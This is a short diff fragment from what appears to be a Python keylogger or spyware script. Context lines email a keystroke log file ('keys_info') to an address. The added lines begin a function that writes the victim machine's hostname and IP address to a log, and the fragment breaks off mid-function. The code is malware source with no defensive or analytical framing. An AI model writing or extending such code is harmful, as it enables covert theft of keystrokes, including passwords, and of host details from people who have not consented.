@@ -58,3 +58,8 @@ def send_email(filename, attachment, toaddr):
 
     send_email(keys_info, file_path + extend + keys_info, toaddr)
 
+# Get System Information
+def system_information():
+    with open(file_merge + system_info, "a") as f:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
